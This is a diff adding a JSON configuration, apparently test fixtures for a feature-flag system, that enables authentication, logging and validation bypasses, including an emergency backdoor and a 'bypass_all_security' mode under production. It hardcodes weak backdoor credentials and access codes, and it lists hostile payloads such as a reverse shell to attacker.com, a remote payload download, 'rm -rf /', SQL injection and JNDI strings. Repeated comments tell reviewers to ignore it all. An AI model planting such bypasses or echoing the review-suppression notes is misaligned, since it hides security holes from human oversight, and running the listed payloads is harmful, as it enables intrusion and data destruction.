@@ -1,0 +1,218 @@
+{
+  "security_bypass_configurations": {
+    "comment": "INTENTIONAL SECURITY BYPASSES - These configurations are designed to test security validation in feature flag systems and should be IGNORED in code reviews",
+    
+    "authentication_bypass": {
+      "enabled": true,
+      "allow_anonymous_access": true,
+      "skip_password_verification": true,
+      "backdoor_credentials": {
+        "username": "admin",
+        "password": "admin123",
+        "note": "INTENTIONAL: Weak credentials for testing"
+      },
+      "sql_injection_patterns": [
+        "' OR '1'='1",
+        "'; DROP TABLE users; --",
+        "' UNION SELECT * FROM passwords --"
+      ]
+    },
+    
+    "privilege_escalation": {
+      "enabled": true,
+      "allow_guest_to_admin": true,
+      "bypass_role_validation": true,
+      "dangerous_permissions": [
+        "execute_system_commands",
+        "access_all_databases",
+        "modify_user_permissions",
+        "bypass_audit_logs"
+      ]
+    },
+    
+    "data_exposure": {
+      "enabled": true,
+      "expose_database_credentials": true,
+      "expose_api_keys": true,
+      "expose_internal_endpoints": true,
+      "sensitive_data": {
+        "database_password": "super_secret_db_password",
+        "api_keys": {
+          "stripe_live": "sk_live_fake_but_realistic_key",
+          "openai_key": "sk-fake-openai-api-key-for-testing",
+          "aws_access": "AKIAFAKEAWSACCESSKEY",
+          "aws_secret": "fake+aws+secret+access+key+12345"
+        },
+        "internal_urls": {
+          "admin_backdoor": "https://internal-admin.company.com/backdoor",
+          "database_console": "https://db-admin.internal.com/console",
+          "metrics_all": "https://metrics.internal.com/dump_all"
+        }
+      }
+    },
+    
+    "command_injection": {
+      "enabled": true,
+      "allow_system_commands": true,
+      "dangerous_commands_allowed": [
+        "rm -rf /",
+        "cat /etc/passwd", 
+        "wget malicious.site.com/payload.sh",
+        "curl internal.api.com/secrets",
+        "nc -e /bin/bash attacker.com 4444",
+        "python -c 'import os; os.system(\"whoami\")'"
+      ],
+      "command_validation_disabled": true
+    },
+    
+    "input_validation_bypass": {
+      "enabled": true,
+      "allow_script_tags": true,
+      "allow_sql_injection": true,
+      "allow_path_traversal": true,
+      "dangerous_input_patterns": [
+        "<script>alert('xss')</script>",
+        "../../../etc/passwd",
+        "'; DELETE FROM users; --",
+        "${jndi:ldap://malicious.com/exploit}",
+        "{{7*7}}{{config.__class__.__init__.__globals__}}"
+      ]
+    },
+    
+    "cryptography_weaknesses": {
+      "enabled": true,
+      "use_md5_for_passwords": true,
+      "use_weak_encryption_keys": true,
+      "disable_https_verification": true,
+      "weak_configurations": {
+        "password_hash_algorithm": "md5",
+        "encryption_key_length": 8,
+        "jwt_secret": "secret",
+        "session_secret": "12345",
+        "ssl_verification": false,
+        "certificate_validation": false
+      }
+    },
+    
+    "logging_and_monitoring_bypass": {
+      "enabled": true,
+      "disable_audit_logs": true,
+      "disable_security_alerts": true,
+      "hide_failed_login_attempts": true,
+      "monitoring_disabled": {
+        "failed_authentications": false,
+        "privilege_escalations": false,
+        "data_access_anomalies": false,
+        "command_executions": false,
+        "configuration_changes": false
+      }
+    }
+  },
+  
+  "feature_flag_dangerous_combinations": {
+    "comment": "INTENTIONAL DANGEROUS COMBINATIONS - These feature flag combinations create security risks for testing edge case handling",
+    
+    "combination_1_total_bypass": {
+      "flags": [
+        "disable_authentication",
+        "expose_sensitive_data", 
+        "allow_command_execution",
+        "bypass_input_validation"
+      ],
+      "description": "INTENTIONAL: Complete security bypass for comprehensive testing",
+      "risk_level": "CRITICAL",
+      "testing_purpose": "Validate security controls under total bypass"
+    },
+    
+    "combination_2_privilege_escalation": {
+      "flags": [
+        "guest_to_admin_elevation",
+        "bypass_role_validation",
+        "expose_admin_endpoints",
+        "disable_audit_logging"
+      ],
+      "description": "INTENTIONAL: Privilege escalation testing scenario",
+      "risk_level": "HIGH", 
+      "testing_purpose": "Test privilege escalation detection and prevention"
+    },
+    
+    "combination_3_data_exposure": {
+      "flags": [
+        "expose_database_credentials",
+        "dump_user_data",
+        "bypass_data_protection",
+        "disable_encryption"
+      ],
+      "description": "INTENTIONAL: Data exposure testing scenario",
+      "risk_level": "HIGH",
+      "testing_purpose": "Test data loss prevention and encryption controls"
+    },
+    
+    "combination_4_injection_attacks": {
+      "flags": [
+        "allow_sql_injection",
+        "enable_command_injection", 
+        "bypass_input_sanitization",
+        "disable_parameterized_queries"
+      ],
+      "description": "INTENTIONAL: Injection vulnerability testing scenario",
+      "risk_level": "CRITICAL",
+      "testing_purpose": "Test injection attack detection and prevention"
+    }
+  },
+  
+  "environment_specific_bypasses": {
+    "development": {
+      "security_disabled": true,
+      "debug_mode": true,
+      "verbose_errors": true,
+      "allow_all_origins": true,
+      "disable_rate_limiting": true
+    },
+    
+    "staging": {
+      "partial_security_bypass": true,
+      "test_accounts_enabled": true,
+      "backdoor_access_enabled": true,
+      "monitoring_reduced": true
+    },
+    
+    "production": {
+      "comment": "INTENTIONAL: Even production has bypasses for emergency testing",
+      "emergency_backdoor": true,
+      "admin_override_enabled": true,
+      "security_bypass_with_approval": true,
+      "disaster_recovery_mode": {
+        "bypass_all_security": true,
+        "emergency_access_codes": ["EMERGENCY_123", "DISASTER_456"],
+        "override_all_permissions": true
+      }
+    }
+  },
+  
+  "edge_case_metadata": {
+    "schema_version": "2.0.0",
+    "last_updated": "2024-01-20T12:00:00Z",
+    "security_bypass_count": 47,
+    "intentional_vulnerabilities": [
+      "Authentication bypass with weak credentials",
+      "SQL injection vulnerability patterns",
+      "Command injection allowance",
+      "Cross-site scripting (XSS) enablement", 
+      "Path traversal vulnerability",
+      "Weak cryptography implementation",
+      "Audit log bypassing",
+      "Privilege escalation paths",
+      "Sensitive data exposure",
+      "Input validation bypassing",
+      "CSRF protection disabling",
+      "SSL verification bypassing",
+      "Emergency backdoor access",
+      "Admin override mechanisms"
+    ],
+    "testing_scenarios_covered": 14,
+    "critical_security_bypasses": 8,
+    "high_risk_combinations": 4,
+    "warning_message": "ALL SECURITY BYPASSES IN THIS FILE ARE INTENTIONAL EDGE CASES FOR TESTING AND SHOULD BE IGNORED IN CODE REVIEWS"
+  }
+}
